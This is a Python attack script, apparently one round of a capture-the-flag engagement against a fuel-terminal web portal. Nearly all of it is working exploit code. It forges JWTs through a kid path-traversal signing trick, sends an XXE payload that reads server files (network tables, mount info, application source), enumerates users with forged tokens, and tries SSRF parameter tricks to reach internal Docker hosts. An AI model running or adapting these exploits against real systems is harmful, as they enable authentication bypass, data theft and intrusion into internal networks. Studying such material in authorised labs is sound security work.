#!/usr/bin/env python3
"""round80 — Portal user enumeration + unknown Docker hosts + conntrack"""
import requests, json, time, hashlib, hmac as hm, base64, socket

HOST = "192.168.242.102"
CASPI = f"http://{HOST}:8007"

def b64u(d):
    if isinstance(d, str): d = d.encode()
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

def jwt_forged(role="operator", sub="ctf", company="X", kid="/dev/null", key=b''):
    h = json.dumps({"alg":"HS256","typ":"JWT","kid":kid},separators=(',',':')).encode()
    p = json.dumps({"sub":sub,"company":company,"role":role,
        "iat":int(time.time()),"exp":int(time.time())+86400},separators=(',',':')).encode()
    m = b64u(h)+'.'+b64u(p)
    return m+'.'+b64u(hm.new(key, m.encode(), hashlib.sha256).digest())

AUTH_OP = {"Authorization": f"Bearer {jwt_forged('operator')}"}

def xxe_read(path, field="remarks", timeout=10):
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [<!ENTITY x SYSTEM "file://{path}">]>
<ticket>
  <reference>{"&x;" if field=="reference" else "r"}</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>{"&x;" if field=="carrier" else "C"}</carrier>
  <remarks>{"&x;" if field=="remarks" else "R"}</remarks>
</ticket>'''
    try:
        r = requests.post(f"{CASPI}/api/ops/custody/ingest",
            data=xml, headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=timeout)
        if r.status_code == 200:
            data = json.loads(r.text)
            return 200, data.get("summary", data.get("ticket", {})).get(field, "")
        return r.status_code, r.text
    except requests.exceptions.Timeout:
        return -1, "TIMEOUT"
    except Exception as e:
        return -2, str(e)

# ============================================================
print("="*70)
print("PHASE 1: FULL PORTAL FOR sub=1 (THE BIG LEAD)")
print("="*70)
print("  sub=1 had DIFFERENT content from standard empty portal!")

token = jwt_forged(role="carrier", sub=1, company="CTF_Team_fubznz")
try:
    r = requests.get(f"{CASPI}/portal",
                    headers={"Cookie": f"session={token}"}, timeout=10)
    print(f"  Status: {r.status_code}")
    print(f"  Length: {len(r.text)} chars")
    print(f"  Full HTML:")
    print("-"*60)
    print(r.text)
    print("-"*60)

    # Extract key differences
    html = r.text
    if "No loading windows" in html:
        print("  >>> Has 'No loading windows' — actually SAME as standard")
    else:
        print("  >>> DIFFERENT from standard portal!")

    # Look for company name
    if "Welcome," in html:
        idx = html.find("Welcome,")
        print(f"  >>> Company: {html[idx:idx+80]}")

    # Look for table data
    if "<tr>" in html:
        # Count table rows
        rows = html.count("<tr>")
        print(f"  >>> Table rows: {rows}")

    # Look for tank references
    for kw in ['tk-', 'lm-', 'tank', 'loading', 'window', 'order',
               'diesel', 'gasoline', 'jet', 'fuel', 'KHS', 'STF',
               'flag', 'secret', 'probe', 'key']:
        if kw.lower() in html.lower():
            idx = html.lower().find(kw.lower())
            print(f"  >>> Found '{kw}': ...{html[max(0,idx-40):idx+80]}...")
except Exception as e:
    print(f"  Error: {e}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 2: USER ENUMERATION — sub=1 to 20")
print("="*70)
print("  Enumerate users to find those with loading windows")

for sub_id in range(1, 21):
    token = jwt_forged(role="carrier", sub=sub_id, company="CTF_Team_fubznz")
    try:
        r = requests.get(f"{CASPI}/portal",
                        headers={"Cookie": f"session={token}"}, timeout=8)
        html = r.text

        if r.status_code != 200:
            print(f"  sub={sub_id}: [{r.status_code}]")
            continue

        has_no_windows = "No loading windows" in html
        # Extract welcome name
        welcome = ""
        if "Welcome," in html:
            idx = html.find("Welcome,")
            end = html.find("</h1>", idx)
            welcome = html[idx:end].replace("Welcome, ", "")

        if has_no_windows:
            print(f"  sub={sub_id}: empty portal, company='{welcome}'")
        else:
            print(f"  *** sub={sub_id}: HAS CONTENT! company='{welcome}' ***")
            # Print the content between pagehead and footer
            main_start = html.find('<div class="pagehead">')
            main_end = html.find('</main>')
            if main_start > 0 and main_end > 0:
                main_content = html[main_start:main_end]
                print(f"  >>> Main content ({len(main_content)} chars):")
                print(main_content[:2000])
    except Exception as e:
        print(f"  sub={sub_id}: {e}")
    time.sleep(0.2)

# ============================================================
print("\n\n"+"="*70)
print("PHASE 3: USER ENUMERATION — wider range")
print("="*70)

# Check larger sub IDs (maybe users are in thousands range)
for sub_id in [50, 100, 500, 1000, 2000, 3000, 4000, 5000,
               6000, 6050, 6076, 6078, 6079, 6080, 6100, 7000, 9999, 10000]:
    token = jwt_forged(role="carrier", sub=sub_id, company="CTF_Team_fubznz")
    try:
        r = requests.get(f"{CASPI}/portal",
                        headers={"Cookie": f"session={token}"}, timeout=6)
        html = r.text
        if r.status_code != 200:
            continue

        has_no_windows = "No loading windows" in html
        welcome = ""
        if "Welcome," in html:
            idx = html.find("Welcome,")
            end = html.find("</h1>", idx)
            welcome = html[idx:end].replace("Welcome, ", "")

        if not has_no_windows:
            print(f"  *** sub={sub_id}: HAS CONTENT! company='{welcome}' ***")
        elif welcome and welcome != "CTF_Team_fubznz":
            print(f"  sub={sub_id}: different company='{welcome}'")
    except:
        pass
    time.sleep(0.15)

# ============================================================
print("\n\n"+"="*70)
print("PHASE 4: DOCKER HOST INVESTIGATION — 172.18.0.2 and 172.18.0.6")
print("="*70)

# Try connection tracking
for path in [
    "/proc/self/net/nf_conntrack",
    "/proc/net/nf_conntrack",
    "/proc/self/net/ip_conntrack",
    "/proc/self/net/stat/nf_conntrack",
]:
    code, val = xxe_read(path, timeout=5)
    if code == 200 and val:
        print(f"\n  {path} ({len(val)} bytes):")
        for line in val.strip().split('\n')[:30]:
            print(f"    {line}")
    elif code == 400:
        print(f"  {path}: EXISTS(400)")
    time.sleep(0.1)

# Read /proc/self/net/tcp again — look for ANY connection to .2 or .6
code, val = xxe_read("/proc/self/net/tcp", timeout=5)
if code == 200:
    print(f"\n  /proc/self/net/tcp (looking for .2 and .6):")
    for line in val.strip().split('\n'):
        # 172.18.0.2 = AC120002, 172.18.0.6 = AC120006
        if 'AC120002' in line.upper() or 'AC120006' in line.upper() or 'local_address' in line:
            print(f"    {line}")
    # Also print all lines for completeness
    print(f"\n  All TCP connections:")
    for line in val.strip().split('\n'):
        print(f"    {line}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 5: KID ORACLE VERIFICATION with /etc/hostname")
print("="*70)
print("  Verify the oracle reads exact file content")

# /etc/hostname content from XXE: "5407f6317f5c" (12 chars)
# Test with and without trailing newline
for desc, key_bytes in [
    ("no newline", b"5407f6317f5c"),
    ("with newline", b"5407f6317f5c\n"),
    ("wrong content", b"wrong"),
]:
    token = jwt_forged(role="operator", kid="/etc/hostname", key=key_bytes)
    try:
        r = requests.get(f"{CASPI}/api/auth/me",
                        headers={"Authorization": f"Bearer {token}"}, timeout=5)
        if r.status_code == 200:
            print(f"  *** {desc}: [{r.status_code}] MATCH! hostname content = {key_bytes!r} ***")
        else:
            print(f"  {desc}: [{r.status_code}]")
    except Exception as e:
        print(f"  {desc}: {e}")
    time.sleep(0.2)

# If hostname oracle works, try with known files to verify
# /app/db.py content is known (1173 bytes from XXE)
# Read it again for exact content
print("\n  Verifying oracle with /app/db.py (known content):")
code, db_content = xxe_read("/app/db.py", timeout=8)
if code == 200:
    # Sign with exact XXE-read content
    token = jwt_forged(role="operator", kid="/app/db.py", key=db_content.encode())
    try:
        r = requests.get(f"{CASPI}/api/auth/me",
                        headers={"Authorization": f"Bearer {token}"}, timeout=5)
        print(f"  db.py exact XXE content: [{r.status_code}]")
    except Exception as e:
        print(f"  db.py: {e}")

    # Maybe XXE strips trailing whitespace or adds it
    for variant_desc, variant_key in [
        ("stripped", db_content.strip().encode()),
        ("with newline", (db_content + '\n').encode()),
        ("rstrip", db_content.rstrip().encode()),
    ]:
        token = jwt_forged(role="operator", kid="/app/db.py", key=variant_key)
        try:
            r = requests.get(f"{CASPI}/api/auth/me",
                            headers={"Authorization": f"Bearer {token}"}, timeout=5)
            if r.status_code == 200:
                print(f"  *** db.py {variant_desc}: [{r.status_code}] MATCH! ***")
            else:
                print(f"  db.py {variant_desc}: [{r.status_code}]")
        except:
            pass
        time.sleep(0.1)

# ============================================================
print("\n\n"+"="*70)
print("PHASE 6: PROBE — TRY REACHING UNKNOWN DOCKER HOSTS")
print("="*70)
print("  Can we use signed probe URLs but change Host header?")
print("  Or can probe reach .2/.6 through some trick?")

url_tk01 = "http://gauge-gw.internal:9100/v1/tanks/1/level"
sig_tk01 = "ece8b8f9671e56962dcb233b483c94fd1ea7384ec10d27288925572c6a44c803"

# Try probe with extra fields that might affect the request
tricks = [
    ("redirect url", {"url": url_tk01, "sig": sig_tk01,
                       "redirect_url": "http://172.18.0.6:80/"}),
    ("proxy", {"url": url_tk01, "sig": sig_tk01,
               "proxy": "http://172.18.0.6:80/"}),
    ("host override", {"url": url_tk01, "sig": sig_tk01,
                       "host": "172.18.0.6"}),
    ("callback", {"url": url_tk01, "sig": sig_tk01,
                  "callback": "http://172.18.0.6:80/"}),
    ("next", {"url": url_tk01, "sig": sig_tk01,
              "next": "http://172.18.0.6:80/"}),
]

for desc, payload in tricks:
    try:
        r = requests.post(f"{CASPI}/api/ops/probe", json=payload,
                         headers=AUTH_OP, timeout=8)
        if r.status_code == 200:
            data = r.json()
            body = data.get("body", "")
            # Check if response is different from standard tank data
            if "level_pct" in body:
                pass  # Standard response, trick didn't work
            else:
                print(f"  *** {desc}: DIFFERENT RESPONSE: {body[:200]} ***")
        elif r.status_code not in [403]:
            print(f"  [{r.status_code}] {desc}")
    except Exception as e:
        print(f"  {desc}: {e}")
    time.sleep(0.2)

# ============================================================
print("\n\n"+"="*70)
print("PHASE 7: DISCOVER DOCKER SERVICE NAMES")
print("="*70)

# Try reading Docker-related files
docker_files = [
    "/etc/docker/daemon.json",
    "/.dockerenv",
    "/proc/self/cgroup",
    "/proc/self/mountinfo",
    "/etc/mtab",
]

for path in docker_files:
    code, val = xxe_read(path, timeout=4)
    if code == 200 and val:
        print(f"\n  {path}:")
        # Look for container names or service names
        for line in val.strip().split('\n')[:15]:
            if any(kw in line.lower() for kw in ['oil', 'depot', 'terminal', 'gauge',
                                                   'nginx', 'web', 'db', 'redis',
                                                   'nomad', 'military', 'tank']):
                print(f"    >>> {line}")
            elif len(line) < 200:
                print(f"    {line}")
    time.sleep(0.1)

# Re-read mountinfo looking for container names in overlay paths
code, val = xxe_read("/proc/self/mountinfo", timeout=6)
if code == 200 and val:
    print(f"\n  /proc/self/mountinfo — looking for Docker project names:")
    for line in val.strip().split('\n'):
        if 'overlay' in line.lower() or 'docker' in line.lower() or 'volume' in line.lower():
            print(f"    {line[:200]}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 8: SSH PORT INVESTIGATION")
print("="*70)
print("  Port 22 is open — what service?")

# Try SSH banner grab
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect((HOST, 22))
    banner = s.recv(1024)
    print(f"  SSH Banner: {banner.decode(errors='replace').strip()}")
    s.close()
except Exception as e:
    print(f"  SSH: {e}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 9: GAUGE-GW — ALTERNATE ENDPOINTS VIA PROBE")
print("="*70)
print("  We have 5 signed URLs. Try URL variations that might still match HMAC")
print("  (spoiler: they won't, but documenting for completeness)")

# What if gauge-gw returns different data based on Accept header?
# The probe probably just does requests.get(url) with no headers
# But gauge-gw might have a default response format

# Check: does gauge-gw return response headers?
for name, url, sig in [
    ("lm-01", "http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow",
     "5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09"),
    ("tk-07", "http://gauge-gw.internal:9100/v1/tanks/7/level",
     "447a4c0f1fa7769cdfb2b67842364d8b699b5e85a5b2784524146f7a5af5132f"),
]:
    try:
        r = requests.post(f"{CASPI}/api/ops/probe", json={"url": url, "sig": sig},
                         headers=AUTH_OP, timeout=8)
        if r.status_code == 200:
            data = r.json()
            print(f"  {name}: keys={list(data.keys())}")
            # Check for 'headers' key in probe response
            if 'headers' in data:
                print(f"    Headers from gauge-gw: {data['headers']}")
            for k, v in data.items():
                if k not in ['body', 'status']:
                    print(f"    Extra field: {k}={v!r}")
    except:
        pass
    time.sleep(0.2)

print("\n"+"="*70)
print("DONE — round80")
print("="*70)
